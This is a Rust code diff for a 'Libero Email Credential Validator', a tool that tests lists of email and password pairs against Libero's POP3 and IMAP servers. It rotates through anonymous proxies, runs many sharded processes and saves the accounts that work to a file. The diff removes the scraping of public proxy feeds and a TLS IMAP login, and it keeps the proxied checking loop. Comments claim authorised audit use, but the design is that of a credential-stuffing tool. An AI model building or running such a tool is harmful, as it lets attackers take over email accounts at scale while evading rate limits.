@@ -39,39 +39,7 @@ use tokio::sync::mpsc::{self, Receiver};
 use tokio::sync::Mutex as AsyncMutex;
 use tokio::task::JoinHandle;
 use tokio::time::interval;
-#[cfg(feature = "free")]
-use tokio_rustls::rustls::ServerName;
-#[cfg(feature = "free")]
-use tokio_rustls::{
-    rustls::{ClientConfig, RootCertStore},
-    TlsConnector,
-};
 use tracing_subscriber::fmt;
-
-#[cfg(feature = "free")]
-mod free;
-#[cfg(not(feature = "free"))]
-mod free {
-    use std::time::Duration;
-    #[derive(Clone)]
-    pub struct FreeManager;
-    impl FreeManager {
-        pub fn len(&self) -> usize {
-            0
-        }
-        pub async fn pop3_login(
-            &self,
-            _host: &str,
-            _port: u16,
-            _user: &str,
-            _pwd: &str,
-            _timeout: Duration,
-            _fast_open: bool,
-        ) -> bool {
-            false
-        }
-    }
-}
 
 // ---------------------------------------------------------------------------
 // ENH#23 – Switch global allocator to jemalloc (zero‑fragmentation at scale)
@@ -400,246 +368,9 @@ async fn watch_proxies(path: String, pool: ProxyPool, interval: u64) {
     }
 }
 
-struct ProxyMetrics {
-    latency_ms: f32,
-    success_rate: f32,
-    throughput_kbps: f32,
-    error_rate: f32,
-    rate_limit_score: f32,
-    uptime_pct: f32,
-    proxy_type: f32,
-    location_score: f32,
-}
 
-fn score_metrics(m: &ProxyMetrics) -> f32 {
-    let latency_norm = 1.0 - (m.latency_ms / 2000.0).min(1.0);
-    let throughput_norm = (m.throughput_kbps / 10_000.0).min(1.0);
-    100.0
-        * (0.20 * latency_norm
-            + 0.20 * m.success_rate
-            + 0.15 * throughput_norm
-            + 0.15 * (1.0 - m.error_rate)
-            + 0.10 * m.rate_limit_score
-            + 0.10 * m.uptime_pct
-            + 0.05 * (m.proxy_type / 2.0)
-            + 0.05 * m.location_score)
-}
-
-async fn test_proxy(proxy: String) -> (String, bool, Duration) {
-    let start = Instant::now();
-    let (scheme, rest) = match proxy.split_once("://") {
-        Some((s, r)) => (s, r),
-        None => ("socks4a", proxy.as_str()),
-    };
-    let mut success = false;
-    let parts: Vec<_> = rest.split(':').collect();
-    if parts.len() == 2 {
-        let addr = format!("{}:{}", parts[0], parts[1]);
-        let stream_res =
-            tokio::time::timeout(Duration::from_secs(5), TcpStream::connect(&addr)).await;
-        let mut stream = match stream_res {
-            Ok(Ok(s)) => s,
-            _ => return (proxy, false, start.elapsed()),
-        };
-        match scheme {
-            "http" | "https" => {
-                let target = "popmail.libero.it:110";
-                let req = format!("CONNECT {target} HTTP/1.1\r\nHost: {target}\r\n\r\n");
-                if stream.write_all(req.as_bytes()).await.is_ok() {
-                    let mut buf = [0u8; 32];
-                    if stream.read_exact(&mut buf).await.is_ok()
-                        && buf.starts_with(b"HTTP/1.")
-                        && std::str::from_utf8(&buf).map_or(false, |s| s.contains("200"))
-                    {
-                        let mut greet = [0u8; 3];
-                        if stream.read_exact(&mut greet).await.is_ok() {
-                            success = &greet == b"+OK";
-                        }
-                    }
-                }
-            }
-            _ => {
-                let mut req = Vec::new();
-                req.push(0x04u8);
-                req.push(0x01u8);
-                req.push(0);
-                req.push(110u8);
-                req.extend(&[0, 0, 0, 1]);
-                req.push(0);
-                req.extend(b"popmail.libero.it");
-                req.push(0);
-                if stream.write_all(&req).await.is_ok() {
-                    let mut resp = [0u8; 8];
-                    if stream.read_exact(&mut resp).await.is_ok() && resp[1] == 0x5a {
-                        let mut buf = [0u8; 3];
-                        if stream.read_exact(&mut buf).await.is_ok() {
-                            success = &buf == b"+OK";
-                        }
-                    }
-                }
-            }
-        }
-    }
-    (proxy, success, start.elapsed())
-}
-
-async fn fetch_scored_proxies() -> Vec<String> {
-    use futures::stream::{FuturesUnordered, StreamExt};
-    use regex::Regex;
-    use std::collections::HashSet;
-
-    const FEEDS: &[&str] = &[
-        "https://www.thebigproxylist.com/api/proxylist.txt",
-        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
-        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
-        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
-        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
-        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
-        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
-        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/all.txt",
-        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
-        "https://raw.githubusercontent.com/proxylistuk/ukproxylist/master/uk_proxies.txt",
-        "https://free-proxy-list.net/",
-        "https://raw.githubusercontent.com/checkerproxy/vps/main/proxy.txt",
-        "https://www.coderduck.com/ports/api/proxy?key=free&https=true&format=txt",
-        "https://cool-proxy.net/proxies.json",
-        "https://raw.githubusercontent.com/Elliottophellia/proxylist/main/proxies.txt",
-        "https://api.experte.com/proxylist?format=txt",
-        "https://floppydata.com/proxies.txt",
-        "https://fosy.club/free-proxy-list.txt",
-        "https://free-proxy-list.com/",
-        "https://freeproxylist.cc/feeds/freeproxylist.txt",
-        "https://www.freeproxylists.com/api/proxylist.txt",
-        "https://www.freeproxylists.net/?format=txt",
-        "https://raw.githubusercontent.com/roosterkid/freeproxylist/main/proxies.txt",
-        "https://freshnewproxies24.top/latest.txt",
-        "http://proxygather.com/api/proxies.txt",
-        "https://proxylist.geonode.com/api/proxy-list?limit=10000&format=txt",
-        "https://api.getproxylist.com/proxy.txt",
-        "https://api.gologin.com/proxylist.txt",
-        "https://googlepassedproxylist.blogspot.com/feeds/posts/default?alt=txt",
-        "https://hidemy.life/en/proxy-list/",
-        "https://raw.githubusercontent.com/zloi-user/hideip.me/master/http.txt",
-        "https://raw.githubusercontent.com/zloi-user/hideip.me/master/https.txt",
-        "https://raw.githubusercontent.com/zloi-user/hideip.me/master/socks4.txt",
-        "https://raw.githubusercontent.com/zloi-user/hideip.me/master/socks5.txt",
-        "https://ipaddress.com/proxy-list/",
-        "https://raw.githubusercontent.com/officialputuid/KangProxy/master/http/http.txt",
-        "https://raw.githubusercontent.com/officialputuid/KangProxy/master/https/https.txt",
-        "https://raw.githubusercontent.com/officialputuid/KangProxy/master/socks4/socks4.txt",
-        "https://raw.githubusercontent.com/officialputuid/KangProxy/master/socks5/socks5.txt",
-        "https://list.proxylistplus.com/Fresh-HTTP-Proxy-List-1",
-        "https://www.proxynova.com/proxy-server-list/",
-        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
-        "https://www.proxy-list.download/api/v1/get?type=http",
-        "https://www.socks-proxy.net/",
-        "https://socks5-proxy-list.blogspot.com/feeds/posts/default",
-        "https://proxydb.net/?protocol=http",
-        "https://sockslist.us/api",
-        "https://spys.one/en/http-proxy-list/",
-        "https://spys.one/en/socks-proxy-list/",
-        "https://raw.githubusercontent.com/spoofs/proxy/main/list.txt",
-        "https://www.sslproxies.org/",
-        "https://free-proxy-list.net/uk-proxy.html",
-        "https://www.us-proxy.org/",
-        "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/proxy-list.txt",
-        "https://workingproxylisttxt.blogspot.com/feeds/posts/default?alt=txt",
-        "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/proxy_list.txt",
-        "https://www.89ip.cn/tqdl.html",
-        "http://www.66ip.cn/mo.php?tqsl=1000",
-        "https://www.kuaidaili.com/free/inha/",
-        "https://raw.githubusercontent.com/a2u/free-proxy-list/main/proxy_list.txt",
-        "https://raw.githubusercontent.com/HUYDGD/AutoGetProxy/master/all_proxies.txt",
-        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/proxies.txt",
-        "https://raw.githubusercontent.com/ForceFledgling/ProxyHub/master/proxy_list.txt",
-        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
-        "https://raw.githubusercontent.com/prxchk/Proxy-List/master/proxy-list.txt",
-        "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/proxies.txt",
-        "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies.txt",
-        "https://raw.githubusercontent.com/gitrecon1455/fresh-proxy-list/main/proxies.txt",
-        "https://raw.githubusercontent.com/vmheaven/VMHeaven-Free-Proxy-Updated/main/http.txt",
-        "https://raw.githubusercontent.com/vmheaven/VMHeaven-Free-Proxy-Updated/main/https.txt",
-        "https://raw.githubusercontent.com/vmheaven/VMHeaven-Free-Proxy-Updated/main/socks4.txt",
-        "https://raw.githubusercontent.com/vmheaven/VMHeaven-Free-Proxy-Updated/main/socks5.txt",
-    ];
-
-    let client = reqwest::Client::builder()
-        .user_agent("Mozilla/5.0")
-        .build()
-        .unwrap();
-
-    let mut set = HashSet::new();
-    let re = Regex::new(r"(\d{1,3}(?:\.\d{1,3}){3}):(\d{2,5})").unwrap();
-    let mut fetches = FuturesUnordered::new();
-    for &url in FEEDS {
-        let c = client.clone();
-        fetches.push(async move {
-            if let Ok(resp) = c.get(url).send().await {
-                resp.text().await.ok()
-            } else {
-                None
-            }
-        });
-    }
-    while let Some(opt) = fetches.next().await {
-        if let Some(txt) = opt {
-            for cap in re.captures_iter(&txt) {
-                set.insert(format!("{}:{}", &cap[1], &cap[2]));
-            }
-        }
-    }
-
-    let mut futs = FuturesUnordered::new();
-    for p in set {
-        futs.push(async move {
-            let (p, ok, dur) = test_proxy(format!("socks4a://{}", p)).await;
-            let metrics = ProxyMetrics {
-                latency_ms: dur.as_secs_f32() * 1000.0,
-                success_rate: if ok { 1.0 } else { 0.0 },
-                throughput_kbps: 0.0,
-                error_rate: if ok { 0.0 } else { 1.0 },
-                rate_limit_score: if dur.as_millis() < 1000 && ok {
-                    1.0
-                } else {
-                    0.0
-                },
-                uptime_pct: 1.0,
-                proxy_type: 1.0,
-                location_score: 0.5,
-            };
-            (p, score_metrics(&metrics))
-        });
-    }
-
-    let mut good = Vec::new();
-    while let Some((proxy, score)) = futs.next().await {
-        if score >= 40.0 {
-            good.push(proxy);
-        }
-    }
-    good
-}
 
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
-
-#[cfg(feature = "free")]
-static TLS_CONFIG: Lazy<Arc<ClientConfig>> = Lazy::new(|| {
-    use tokio_rustls::rustls::OwnedTrustAnchor;
-    let mut roots = RootCertStore::empty();
-    roots.add_server_trust_anchors(webpki_roots::TLS_SERVER_ROOTS.iter().map(|ta| {
-        OwnedTrustAnchor::from_subject_spki_name_constraints(
-            ta.subject.as_ref().to_vec(),
-            ta.subject_public_key_info.as_ref().to_vec(),
-            ta.name_constraints.as_ref().map(|nc| nc.as_ref().to_vec()),
-        )
-    }));
-    Arc::new(
-        ClientConfig::builder()
-            .with_safe_defaults()
-            .with_root_certificates(roots)
-            .with_no_client_auth(),
-    )
-});
 
 #[allow(dead_code)]
 struct POP3Handler {
@@ -746,53 +477,6 @@ impl IMAPHandler {
         }
     }
 
-    #[cfg(feature = "free")]
-    async fn login(&self, user: &str, pwd: &str) -> bool {
-        let addr = format!("{}:{}", self.host, self.port);
-        let tcp = match tokio::time::timeout(self.timeout, TcpStream::connect(&addr)).await {
-            Ok(Ok(s)) => s,
-            _ => return false,
-        };
-
-        let domain = match ServerName::try_from(self.host.as_str()) {
-            Ok(d) => d,
-            Err(_) => return false,
-        };
-
-        let connector = TlsConnector::from(TLS_CONFIG.clone());
-        let mut stream = match connector.connect(domain, tcp).await {
-            Ok(s) => s,
-            Err(_) => return false,
-        };
-
-        let tag = "A1";
-        let login = format!("{tag} LOGIN {} {}\r\n", user, pwd);
-        if tokio::time::timeout(self.timeout, stream.write_all(login.as_bytes()))
-            .await
-            .is_err()
-        {
-            return false;
-        }
-        let logout = format!("{tag} LOGOUT\r\n");
-        if tokio::time::timeout(self.timeout, stream.write_all(logout.as_bytes()))
-            .await
-            .is_err()
-        {
-            return false;
-        }
-
-        let mut buf = Vec::new();
-        if tokio::time::timeout(self.timeout, stream.read_to_end(&mut buf))
-            .await
-            .is_err()
-        {
-            return false;
-        }
-        let resp = String::from_utf8_lossy(&buf);
-        resp.contains(&format!("{tag} OK"))
-    }
-
-    #[cfg(not(feature = "free"))]
     async fn login(&self, _user: &str, _pwd: &str) -> bool {
         let _ = self;
         false
@@ -925,80 +609,6 @@ fn make_table(stats: &Stats, start: Instant, cfg: &Config, proxies: &ProxyPool) 
     );
 }
 
-fn dashboard(stats: Arc<Stats>, _start: Instant) -> anyhow::Result<()> {
-    use crossterm::{
-        event, execute,
-        terminal::{disable_raw_mode, enable_raw_mode, EnterAlternateScreen, LeaveAlternateScreen},
-    };
-    use ratatui::{
-        prelude::*,
-        widgets::{Block, Borders, Gauge, Paragraph},
-    };
-    let mut stdout = std::io::stdout();
-    enable_raw_mode()?;
-    execute!(stdout, EnterAlternateScreen)?;
-    let backend = ratatui::prelude::CrosstermBackend::new(stdout);
-    let mut terminal = ratatui::Terminal::new(backend)?;
-    loop {
-        terminal.draw(|f| {
-            let size = f.size();
-            let total = stats.total.load(Ordering::Relaxed);
-            let checked = stats.checked.load(Ordering::Relaxed);
-            let valid = stats.valid.load(Ordering::Relaxed);
-            let invalid = stats.invalid.load(Ordering::Relaxed);
-            let errors = stats.errors.load(Ordering::Relaxed);
-            let progress = if total > 0 {
-                checked as f64 / total as f64
-            } else {
-                0.0
-            };
-            let gauge = Gauge::default()
-                .block(Block::default().title("Progress").borders(Borders::ALL))
-                .gauge_style(Style::default().fg(Color::Green))
-                .ratio(progress);
-            let text = Paragraph::new(format!(
-                "chk:{} ok:{} bad:{} err:{} rem:{}",
-                checked,
-                valid,
-                invalid,
-                errors,
-                total.saturating_sub(checked)
-            ))
-            .block(Block::default().borders(Borders::ALL));
-            f.render_widget(
-                gauge,
-                Rect {
-                    x: 0,
-                    y: 0,
-                    width: size.width,
-                    height: 3,
-                },
-            );
-            f.render_widget(
-                text,
-                Rect {
-                    x: 0,
-                    y: 4,
-                    width: size.width,
-                    height: 3,
-                },
-            );
-        })?;
-        if event::poll(Duration::from_millis(100))? {
-            if let event::Event::Key(k) = event::read()? {
-                if k.code == event::KeyCode::Char('q') {
-                    break;
-                }
-            }
-        }
-        if stats.checked.load(Ordering::Relaxed) >= stats.total.load(Ordering::Relaxed) {
-            break;
-        }
-    }
-    disable_raw_mode()?;
-    execute!(terminal.backend_mut(), LeaveAlternateScreen)?;
-    Ok(())
-}
 
 #[repr(align(64))]
 struct Stats {
@@ -1031,7 +641,6 @@ fn create_consumer(
     stats: Arc<Stats>,
     cfg: Arc<Config>,
     proxies: ProxyPool,
-    free: Option<Arc<free::FreeManager>>,
     valid_f: Arc<Mutex<BufWriter<File>>>,
     invalid_f: Arc<Mutex<BufWriter<File>>>,
     error_f: Arc<Mutex<BufWriter<File>>>,
@@ -1049,32 +658,7 @@ fn create_consumer(
             let matrix = cfg.matrix(domain);
 
             for retry in 0..=cfg.max_retries {
-                if let Some(pm) = &free {
-                    for item in &matrix {
-                        if let MatrixItem::Pop { host, port, .. } = item {
-                            for _ in 0..pm.len() {
-                                if pm
-                                    .pop3_login(
-                                        host,
-                                        *port,
-                                        &email,
-                                        &pwd,
-                                        Duration::from_secs_f64(cfg.timeout),
-                                        cfg.fast_open,
-                                    )
-                                    .await
-                                {
-                                    ok = true;
-                                    break;
-                                }
-                            }
-                            net_err = false;
-                            if ok {
-                                break;
-                            }
-                        }
-                    }
-                } else {
+                {
                     let proxy = proxies.next();
                     if proxy.is_empty() {
                         net_err = true;
@@ -1187,9 +771,7 @@ struct Config {
     full: bool,
     refresh: f64,
     shards: usize,
-    free: bool,
     fast_open: bool,
-    ui: bool,
     _nic_queue_pin: bool,
 }
 
@@ -1269,18 +851,12 @@ struct Cli {
     /// Dashboard refresh rate seconds (min 0.016)
     #[arg(long)]
     refresh: Option<f64>,
-    /// Use free backends
-    #[arg(long)]
-    free: bool,
     /// Proxy reload interval seconds
     #[arg(long = "proxy-watch", default_value_t = 30)]
     proxy_watch: u64,
     /// Enable TCP Fast Open
     #[arg(long)]
     fast_open: bool,
-    /// Interactive dashboard
-    #[arg(long)]
-    ui: bool,
     /// Shards (fork processes)
     //The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
     //Key legitimate use cases include:
@@ -1310,9 +886,7 @@ fn merge_cfg(cli: Cli) -> Config {
         full: false,
         refresh: 0.016,
         shards: cli.shards,
-        free: cli.free,
         fast_open: cli.fast_open,
-        ui: cli.ui,
         _nic_queue_pin: false,
     };
     if let Some(c) = cli.conc {
@@ -1333,7 +907,7 @@ fn merge_cfg(cli: Cli) -> Config {
     if let Some(rf) = cli.refresh {
         cfg.refresh = rf.max(0.016);
     }
-    if cfg.free && cli.shards == 1 {
+    if cli.shards == 1 {
         cfg.shards = 3;
     }
     cfg
@@ -1344,16 +918,7 @@ fn merge_cfg(cli: Cli) -> Config {
 //LECV must only be used in contexts where explicit consent, organizational ownership, or legal authority exists for all credentials tested. Unauthorized use may violate privacy laws (e.g., GDPR, CFAA, Italian Data Protection Code) and result in criminal liability.
 //#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.
 async fn run_validator(cfg: Arc<Config>) {
-    let free = None;
-    let proxies = if cfg.free {
-        let list = fetch_scored_proxies().await;
-        if list.is_empty() {
-            eprintln!("No proxy passed the preliminary test – aborting");
-            std::process::exit(1);
-        }
-        println!("Fetched {} proxies", list.len());
-        ProxyPool::new(list)
-    } else {
+    let proxies = {
         let p = load_proxies(&cfg.proxy_file);
         println!("Loaded {} proxies", p.size());
         let watch_pool = p.clone();
@@ -1401,7 +966,6 @@ async fn run_validator(cfg: Arc<Config>) {
             stats.clone(),
             cfg.clone(),
             proxies.clone(),
-            free.clone(),
             valid_f.clone(),
             invalid_f.clone(),
             error_f.clone(),
@@ -1439,18 +1003,10 @@ async fn run_validator(cfg: Arc<Config>) {
     });
 
     let start = Instant::now();
-    if cfg.ui {
-        let s = stats.clone();
-        tokio::task::spawn_blocking(move || {
-            dashboard(s, start).ok();
-        });
-    }
     let mut ticker = interval(Duration::from_secs_f64(cfg.refresh)); // ~60 Hz
     loop {
         ticker.tick().await; // This yields exactly each refresh interval
-        if !cfg.ui {
-            make_table(&stats, start, &cfg, &proxies);
-        }
+        make_table(&stats, start, &cfg, &proxies);
         if stats.checked.load(Ordering::Relaxed) >= stats.total.load(Ordering::Relaxed) {
             break;
         }
